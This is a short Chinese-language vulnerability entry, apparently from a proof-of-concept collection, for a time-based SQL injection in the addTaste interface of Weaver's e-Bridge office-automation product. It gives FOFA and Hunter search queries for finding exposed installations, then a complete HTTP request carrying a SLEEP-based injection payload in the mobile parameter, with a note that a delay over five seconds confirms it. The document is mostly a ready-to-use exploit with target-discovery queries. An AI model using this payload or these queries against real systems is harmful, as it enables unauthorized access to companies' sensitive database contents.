## 泛微云桥 e-Bridge addTaste接口SQL注入漏洞

e-Bridge 提供了一套全面的办公自动化工具，包括文档管理、流程管理、协同办公、知识管理、移动办公等功能。它的核心理念是将企业内部的各种业务流程数字化，并通过云端技术实现跨部门、跨地域的协同办公和信息共享。该系统 addTaste接口存在SQL注入漏洞，通过此漏洞攻击者可获取企业数据库敏感数据。


## fofa
```
app="泛微-云桥e-Bridge"
```
## hunter
```
app.name="泛微云桥 e-Bridge OA"
```

## poc
```
GET /taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(9-(IF(18015%3e3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: */*
Cookie: EBRIDGE_JSESSIONID=CAE1276AE2279FD98B96C54DE624CD18; sl-session=BmCjG8ZweGWzoSGpQ1QgQg==; EBRIDGE_JSESSIONID=21D2D790531AD7941D060B411FABDC10
Accept-Encoding: gzip
SL-CE-SUID: 25
```
延迟时间大于5秒

![0369e1c147602f35b76105a4f2aebd91](https://github.com/wy876/POC/assets/139549762/0aee421c-131e-4a03-b2d9-c046abdb27f2)
